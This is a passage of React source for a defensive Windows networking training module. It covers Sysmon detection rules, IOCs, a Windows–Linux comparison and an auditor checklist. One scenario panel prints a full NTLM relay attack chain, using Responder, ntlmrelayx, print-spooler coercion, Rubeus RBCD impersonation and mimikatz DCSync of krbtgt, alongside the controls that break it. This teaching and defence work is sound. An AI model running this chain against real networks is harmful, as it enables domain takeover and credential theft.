{`<NetworkConnect onmatch="include">`}
{`  <Image condition="end with">powershell.exe</Image>`}
{`  <DestinationPort condition="is">445</DestinationPort>`}
{`</NetworkConnect>`}
{``}
{`<!-- Detect WinRM lateral movement: -->`}
{`<NetworkConnect onmatch="include">`}
{`  <DestinationPort condition="is">5985</DestinationPort>`}
{`  <Image condition="end with">powershell.exe</Image>`}
{`</NetworkConnect>`}
{``}
{`<!-- Detect wsmprovhost spawning shells: -->`}
{`<ProcessCreate onmatch="include">`}
{`  <ParentImage condition="end with">wsmprovhost.exe</ParentImage>`}
{`</ProcessCreate>`}
{``}
{`<!-- Detect wmiprvse spawning shells: -->`}
{`<ProcessCreate onmatch="include">`}
{`  <ParentImage condition="end with">wmiprvse.exe</ParentImage>`}
{`  <Image condition="end with">cmd.exe</Image>`}
{`</ProcessCreate>`}
{``}
{`<!-- Detect RPC to unexpected destinations: -->`}
{`<NetworkConnect onmatch="include">`}
{`  <DestinationPort condition="is">135</DestinationPort>`}
{`  <Image condition="end with">powershell.exe</Image>`}
{`</NetworkConnect>`}
{``}
{`<!-- WMI persistence detection (Event 19/20/21): -->`}
{`<WmiEvent onmatch="include" />`}
{`<!-- All WMI subscription events — baseline and alert -->`}
              </div>
            </div>
          )}

          {monTab === "tools" && (
            <div style={S.grid2}>
              {[
                ["TCPView (Sysinternals)", "tcpview.exe", "Real-time TCP/UDP connection view with process. Shows all active connections, resolved hostnames, PIDs. GUI equivalent of netstat -anob.", C.cyan],
                ["Wireshark / tshark", "tshark -i eth0 -f 'port 445'", "Packet capture and analysis. Essential for SMB protocol analysis, NTLM relay investigation, DNS poisoning detection. Decrypt SMB3 with session keys.", C.green],
                ["Network Connection Monitor (netstat)", "netstat -ano | findstr ESTABLISHED", "Built-in. Show all established connections with PIDs. Correlate PIDs to process names to detect C2 beacons.", C.dim],
                ["Zeek (formerly Bro)", "zeek -r capture.pcap", "Network traffic analysis framework. Protocol parsers for SMB, RPC, DNS, HTTP, Kerberos. Generates connection logs for SIEM correlation.", C.orange],
                ["Responder (understand to defend)", "Responder.py -I eth0 -rdwP", "LLMNR/NBT-NS/mDNS poisoning tool. Understanding how it works is essential for tuning detection. Run in analyze mode to see what's being queried.", C.red],
                ["CrackMapExec (understand to defend)", "crackmapexec smb 10.0.0.0/24", "SMB/WinRM/RDP/LDAP lateral movement framework. Blue teams use it for security assessment. Generates known attack signatures for IDS tuning.", C.red],
              ].map(([t, cmd, d, c]) => (
                <div key={t} style={{ background: "#08090d", border: `1px solid ${c}22`, borderRadius: "4px", padding: "10px" }}>
                  <div style={{ color: c, fontWeight: "700", fontSize: "11px" }}>{t}</div>
                  <div style={{ color: C.dim, fontSize: "10px", fontStyle: "italic", marginBottom: "4px" }}>{cmd}</div>
                  <div style={{ color: C.text, fontSize: "11px" }}>{d}</div>
                </div>
              ))}
            </div>
          )}

          {monTab === "iocs" && (
            <div>
              <div style={{ color: C.yellow, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ NETWORK LATERAL MOVEMENT IOC MATRIX</div>
              <div style={S.grid2}>
                {[
                  ["SMB session from workstation to workstation", "Workstation-to-workstation SMB (port 445) is almost never legitimate. High-confidence lateral movement indicator.", C.red],
                  ["wmiprvse.exe or wsmprovhost.exe spawning cmd/PS", "Remote code execution via WMI or WinRM. Sysmon Event 1 parent process chain is the key detector.", C.red],
                  ["powershell.exe outbound to port 445 or 135", "PowerShell making direct SMB or RPC calls — lateral movement or credential dumping via remote registry.", C.red],
                  ["LLMNR/NBT-NS response from non-DC/DNS IP", "Responder or equivalent poisoning active on the network. Indicates attacker in position to capture NTLM hashes.", C.orange],
                  ["DC authenticating outbound to workstation IP", "PrintNightmare or similar coercion attack. DC should never initiate auth TO workstation. Event 4624 on workstation from DC.", C.red],
                  ["New service with random name from remote IP", "PsExec-style attack. Event 7045 with random service name + binary in ADMIN$ path. Correlate with source IP.", C.orange],
                  ["WMI subscription created (Sysmon 19/20/21)", "WMI persistence planted. Any WMI event subscription is suspicious on non-SCCM/monitoring systems.", C.orange],
                  ["DNS query subdomain length > 50 chars", "Possible DNS tunneling (dnscat2, iodine). Baseline normal DNS patterns, alert on anomalous subdomain depths.", C.yellow],
                ].map(([t, d, c]) => (
                  <div key={t} style={{ background: "#08090d", border: `1px solid ${c}22`, borderRadius: "4px", padding: "9px", marginBottom: "7px" }}>
                    <div style={{ color: c, fontSize: "11px", fontWeight: "700", marginBottom: "3px" }}>▸ {t}</div>
                    <div style={{ color: C.dim, fontSize: "10.5px" }}>{d}</div>
                  </div>
                ))}
              </div>
            </div>
          )}
        </PB>

        {/* ── 10: Windows vs Linux Networking ── */}
        <PB title="WINDOWS vs LINUX — NETWORKING COMPARISON" icon="🐧" color={C.cyan}>
          <div style={{ display: "flex", gap: "8px", marginBottom: "14px", flexWrap: "wrap" }}>
            {["protocols","firewall","dns","tools"].map(t => (
              <button key={t} style={S.tab(cmpTab === t, C.cyan)} onClick={() => setCmpTab(t)}>{t.toUpperCase()}</button>
            ))}
          </div>
          <div style={{ display: "grid", gridTemplateColumns: "1fr 20px 1fr", gap: "0", alignItems: "start" }}>
            <div style={{ background: "#00101a", border: `1px solid ${C.cyan}22`, borderRadius: "4px", padding: "12px" }}>
              <div style={{ color: C.cyan, fontWeight: "700", fontSize: "12px", marginBottom: "10px" }}>⊞ WINDOWS</div>
              {cmpTab === "protocols" && <>
                <KV k="File sharing" v="SMB (srv2.sys) — TCP 445. Kerberos/NTLM auth." kc={C.cyan} />
                <KV k="Remote mgmt" v="WinRM (WSMan) — 5985/5986. PowerShell Remoting." kc={C.cyan} />
                <KV k="Remote shell" v="WinRS / PSSession (WinRM-based, not SSH by default)" kc={C.cyan} />
                <KV k="RPC/IPC" v="MS-RPC over TCP 135 + dynamic (DCOM/WMI)" kc={C.cyan} />
                <KV k="Name resolution" v="DNS → LLMNR → NetBIOS (layered, all by default)" kc={C.cyan} />
                <KV k="Kernel stack" v="tcpip.sys + NDIS + AFD.sys (proprietary)" kc={C.cyan} />
              </>}
              {cmpTab === "firewall" && <>
                <KV k="Engine" v="WFP (Windows Filtering Platform) — kernel callouts" kc={C.cyan} />
                <KV k="Management" v="netsh advfirewall / wf.msc / New-NetFirewallRule" kc={C.cyan} />
                <KV k="App identity" v="Per-process rules (PID → image path mapping)" kc={C.cyan} />
                <KV k="Network profiles" v="Domain / Private / Public (different rule sets)" kc={C.cyan} />
                <KV k="DPI capability" v="WFP STREAM layer + callout drivers (AV/EDR hooks)" kc={C.cyan} />
                <KV k="Logging" v="Event 5156/5157 in Security log + WFP logging file" kc={C.cyan} />
              </>}
              {cmpTab === "dns" && <>
                <KV k="Client service" v="dnscache service (dnsapi.dll)" kc={C.cyan} />
                <KV k="Server" v="DNS Server role (DNS.exe) — AD integrated" kc={C.cyan} />
                <KV k="Resolution order" v="hosts → cache → DNS → LLMNR → NetBIOS" kc={C.cyan} />
                <KV k="DNSSEC" v="Supported on 2008 R2+. Client validation in 2012+." kc={C.cyan} />
                <KV k="Dynamic DNS" v="Clients auto-register A/PTR records via DNS Update" kc={C.cyan} />
                <KV k="AD integration" v="DNS stored in AD partitions — replicated via DRS" kc={C.cyan} />
              </>}
              {cmpTab === "tools" && <>
                <KV k="Connection state" v="netstat -ano / Get-NetTCPConnection" kc={C.cyan} />
                <KV k="Packet capture" v="netsh trace / Wireshark (WinPcap/Npcap)" kc={C.cyan} />
                <KV k="Port scan" v="Test-NetConnection -Port / Nmap with Npcap" kc={C.cyan} />
                <KV k="Routing" v="route print / Get-NetRoute" kc={C.cyan} />
                <KV k="DNS debug" v="Resolve-DnsName / nslookup / ipconfig /displaydns" kc={C.cyan} />
                <KV k="SMB debug" v="Get-SmbSession / net use / Wireshark SMB dissector" kc={C.cyan} />
              </>}
            </div>
            <div style={{ display: "flex", alignItems: "center", justifyContent: "center", color: C.dim, fontSize: "18px" }}>⟷</div>
            <div style={{ background: "#0a180a", border: `1px solid ${C.green}22`, borderRadius: "4px", padding: "12px" }}>
              <div style={{ color: C.green, fontWeight: "700", fontSize: "12px", marginBottom: "10px" }}>🐧 LINUX</div>
              {cmpTab === "protocols" && <>
                <KV k="File sharing" v="NFS (kernel), Samba (SMB compat), SFTP via SSH" kc={C.green} />
                <KV k="Remote mgmt" v="SSH (OpenSSH) — TCP 22. Native remote shell." kc={C.green} />
                <KV k="Remote shell" v="SSH — first-class, encrypted, key-based auth by default" kc={C.green} />
                <KV k="RPC/IPC" v="D-Bus (local), ONC-RPC (NFS/NIS), Unix domain sockets" kc={C.green} />
                <KV k="Name resolution" v="DNS → mDNS (Avahi) → NetBIOS (optional nsswitch.conf)" kc={C.green} />
                <KV k="Kernel stack" v="net_device + socket layer + netfilter (open source)" kc={C.green} />
              </>}
              {cmpTab === "firewall" && <>
                <KV k="Engine" v="Netfilter (kernel) — iptables / nftables hooks" kc={C.green} />
                <KV k="Management" v="iptables / nftables / firewalld / ufw (frontends)" kc={C.green} />
                <KV k="App identity" v="No built-in app identity — cgroup owner or UID rules" kc={C.green} />
                <KV k="Network profiles" v="Zones (firewalld) — but not auto-detected like Windows" kc={C.green} />
                <KV k="DPI capability" v="nfqueue + userspace tools (Snort, Suricata via NFQUEUE)" kc={C.green} />
                <KV k="Logging" v="iptables LOG target → syslog / journald" kc={C.green} />
              </>}
              {cmpTab === "dns" && <>
                <KV k="Client service" v="systemd-resolved / nsswitch.conf / dnsmasq" kc={C.green} />
                <KV k="Server" v="BIND9 / Unbound / PowerDNS (file or DB-backed)" kc={C.green} />
                <KV k="Resolution order" v="/etc/hosts → /etc/nsswitch.conf → DNS" kc={C.green} />
                <KV k="DNSSEC" v="BIND + Unbound both support. Client validation common." kc={C.green} />
                <KV k="Dynamic DNS" v="dhclient hooks / nsupdate (RFC 2136)" kc={C.green} />
                <KV k="AD integration" v="No native. BIND with AD zone delegation possible." kc={C.green} />
              </>}
              {cmpTab === "tools" && <>
                <KV k="Connection state" v="ss -tulnp / netstat -tulnp" kc={C.green} />
                <KV k="Packet capture" v="tcpdump / Wireshark (libpcap)" kc={C.green} />
                <KV k="Port scan" v="nmap / nc -zv / bash /dev/tcp" kc={C.green} />
                <KV k="Routing" v="ip route / traceroute / mtr" kc={C.green} />
                <KV k="DNS debug" v="dig / nslookup / resolvectl query / systemd-resolve" kc={C.green} />
                <KV k="SMB debug" v="smbclient / smbstatus / Wireshark" kc={C.green} />
              </>}
            </div>
          </div>
        </PB>

        {/* ── 11: Enterprise Scenario ── */}
        <PB title="ENTERPRISE SCENARIO — NTLM RELAY LEADS TO DOMAIN ADMIN" icon="⚠" color={C.orange} accent={C.orange + "44"}>
          <div style={{ color: C.red, fontWeight: "700", marginBottom: "12px", fontSize: "12px" }}>
            🔥 SCENARIO: Attacker on Corporate Wi-Fi Relays NTLM via Print Spooler Coercion → DA in 45 Minutes
          </div>
          <div style={S.grid2}>
            <div>
              <div style={{ color: C.orange, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ ATTACK CHAIN</div>
              <div style={S.code}>
{`# Step 1: Attacker on guest Wi-Fi (same L2 as corp)`}
{`# SMB signing: NOT required (default)`}
{`# LLMNR: enabled (default)`}
{``}
{`# Step 2: Start Responder + ntlmrelayx`}
{`Responder -I eth0 -rdwP -v`}
{`ntlmrelayx.py -t ldaps://10.0.0.1 `}
{`    --delegate-access --no-smb-server`}
{``}
{`# Step 3: Trigger Print Spooler coercion against DC`}
{`# SpoolSample.exe DC01.corp.local attacker.ip`}
{`# DC's computer account sends NTLM auth to attacker`}
{``}
{`# Step 4: ntlmrelayx relays DC$ NTLM to LDAP`}
{`# Creates attacker computer account in AD`}
{`# Writes DC01's msDS-AllowedToActOnBehalfOfOtherIdentity`}
{`# → attacker computer can impersonate any user TO DC`}
{``}
{`# Step 5: RBCD exploitation`}
{`Rubeus.exe s4u /user:attacker$ /rc4:<hash>`}
{`    /impersonateuser:Administrator`}
{`    /msdsspn:cifs/DC01.corp.local`}
{`    /ptt`}
{``}
{`# Step 6: DCSync from DC01 via impersonation`}
{`mimikatz lsadump::dcsync /domain:corp.local`}
{`    /user:krbtgt`}
{`# → KRBTGT hash → Golden Ticket`}
              </div>
            </div>
            <div>
              <div style={{ color: C.green, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ WHAT WOULD HAVE STOPPED THIS</div>
              <div style={S.code}>
{`# PREVENTION (any ONE of these breaks the chain):`}
{``}
{`# 1. SMB signing required (MOST IMPORTANT):`}
{`Set-SmbServerConfiguration -RequireSecuritySignature $true`}
{`Set-SmbClientConfiguration -RequireSecuritySignature $true`}
{`# Relay fails: signed session required → hash useless`}
{``}
{`# 2. LDAP signing + channel binding:`}
{`# GPO: Domain Controller: LDAP server signing = Require signing`}
{`# Relay to LDAPS also blocked by EPA (channel binding)`}
{``}
{`# 3. Disable Print Spooler on DCs:`}
{`Stop-Service Spooler`}
{`Set-Service Spooler -StartupType Disabled`}
{`# No coercion possible = no NTLM auth from DC`}
{``}
{`# 4. Network segmentation:`}
{`# Block L2 broadcast between guest Wi-Fi and corp`}
{`# LLMNR/NBT-NS poisoning impossible cross-VLAN`}
{``}
{`# 5. MachineAccountQuota = 0:`}
{`Set-ADDomain -Identity corp.local `}
{`    -Replace @{ms-DS-MachineAccountQuota=0}`}
{`# ntlmrelayx cannot create computer account`}
{``}
{`# DETECTION (should have fired):`}
{`# Event 4624 Type 3: DC01$ authenticating to attacker IP`}
{`# Event 5137: Computer account created by non-admin`}
{`# Event 5136: msDS-AllowedToActOnBehalfOfOtherIdentity changed`}
{`# Event 4662: DCSync from created account`}
              </div>
            </div>
          </div>
          <hr style={S.sep} />
          <div style={S.grid3}>
            {[
              ["Root Cause Stack", "No SMB signing + LLMNR enabled + Print Spooler on DC + MachineAccountQuota=10 + LDAP not protected = every relay attack works", C.orange],
              ["Single highest-impact fix", "Enforce SMB signing everywhere. Breaks 90% of NTLM relay attacks instantly. Zero applications break. Takes 5 minutes to configure via GPO.", C.cyan],
              ["Defence-in-depth goal", "No single control should be relied on. SMB signing + Disable Print Spooler on DCs + Network VLAN separation + MachineAccountQuota=0 = attack chain broken at 4 independent points.", C.green],
            ].map(([t, d, c]) => (
              <div key={t} style={{ background: "#09090d", border: `1px solid ${c}33`, borderRadius: "4px", padding: "10px" }}>
                <div style={{ color: c, fontWeight: "700", fontSize: "11px", marginBottom: "4px" }}>▸ {t}</div>
                <div style={{ color: C.dim, fontSize: "11px" }}>{d}</div>
              </div>
            ))}
          </div>
        </PB>

        {/* ── 12: Checklist + Summary ── */}
        <PB title="AUDITOR CHECKLIST + SUMMARY" icon="✓" color={C.green}>
          <div style={S.grid2}>
            {[
              [C.red, "SMB — Critical Controls", [
                "SMB1 disabled: Get-WindowsOptionalFeature -FeatureName SMB1Protocol = Disabled",
                "SMB signing required on ALL servers (not just DCs): RequireSecuritySignature = True",
                "SMB signing required on ALL clients: SmbClientConfiguration RequireSecuritySignature = True",
                "SMB3 encryption enabled on sensitive shares: EncryptData = True",
                "Outbound SMB (port 445) from workstations blocked at internal firewall",
              ]],
              [C.orange, "RPC / DCOM / WinRM", [
                "Print Spooler disabled on all DCs (PrintNightmare / coercion prevention)",
                "RPC inbound restricted by host-based firewall (allow only from management IPs)",
                "WinRM restricted to HTTPS (5986) only — HTTP listener removed",
                "WinRM IP filter configured to PAW/management subnet only",
                "WMI subscription baseline established — alert on any new WMI persistence subscription",
              ]],
              [C.cyan, "DNS / Name Resolution", [
                "LLMNR disabled via GPO (Turn off Multicast Name Resolution = Enabled)",
                "NetBIOS over TCP/IP disabled on all adapters (SetTcpipNetbios=2)",
                "DNSSEC enabled on AD DNS zones (for sensitive zones)",
                "DNS audit logging enabled on DC DNS server (log all queries)",
                "hosts file monitored for unauthorized entries (Sysmon Event 11 on hosts file path)",
              ]],
              [C.purple, "Firewall & Segmentation", [
                "Windows Firewall enabled on all profiles (Domain/Private/Public) on all systems",
                "WFP logging enabled (Event 5157 for blocked connections to SIEM)",
                "Network segmentation: workstation-to-DC on auth ports only, no direct admin access",
                "Perimeter: SMB (445), RDP (3389), RPC (135) blocked inbound from Internet",
                "Guest Wi-Fi VLAN isolated from corporate network at L2 (no broadcast crossing)",
              ]],
            ].map(([c, title, items]) => (
              <div key={title} style={{ background: "#09090d", border: `1px solid ${c}22`, borderRadius: "4px", padding: "12px" }}>
                <div style={{ color: c, fontWeight: "700", fontSize: "11px", marginBottom: "8px" }}>▸ {title}</div>
                {items.map(item => (
                  <div key={item} style={{ display: "flex", gap: "6px", marginBottom: "5px" }}>
                    <span style={{ color: C.dim, fontSize: "11px" }}>☐</span>
                    <span style={{ color: C.dim, fontSize: "11px" }}>{item}</span>
                  </div>
                ))}
              </div>
            ))}
          </div>
          <hr style={S.sep} />
          <div style={S.grid3}>
            {[
              ["SMB signing = relay blocker", "The single most impactful network security control in Windows environments. Enforcing signing on both client and server breaks NTLM relay attacks that require unsigned sessions. Zero legitimate applications break.", C.red],
              ["LLMNR/NBT-NS off = no poisoning", "Disabling LLMNR and NetBIOS removes the Responder attack surface completely. No legitimate use case in a managed AD environment with functioning DNS. Enable via GPO in 2 minutes.", C.orange],
              ["Port 445 containment = lateral barriers", "Blocking workstation-to-workstation SMB is the single most effective control against automated worm-style lateral movement. Infected workstation cannot spread via SMB to peers.", C.green],
            ].map(([t, d, c]) => (
              <div key={t} style={{ background: "#09090d", border: `1px solid ${c}22`, borderRadius: "4px", padding: "12px" }}>
                <div style={{ color: c, fontWeight: "700", fontSize: "11px", marginBottom: "5px" }}>▸ {t}</div>
                <div style={{ color: C.dim, fontSize: "11px" }}>{d}</div>
              </div>
            ))}
          </div>
          <hr style={S.sep} />
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", flexWrap: "wrap", gap: "10px" }}>
            <div style={{ color: C.dim, fontSize: "11px" }}>
              <span style={{ color: C.green }}>NEXT MODULE →</span> Step 10: PowerShell & WMI Internals — Engine Architecture, Remoting, Logging, Abuse & Defence
            </div>
            <div style={{ display: "flex", gap: "8px" }}>
              <Pill c={C.green}>Step 09 Complete</Pill>
              <Pill c={C.sky}>12 Panels · Windows Networking Mastered</Pill>
            </div>
          </div>
        </PB>

      </div>
    </div>
  );
}
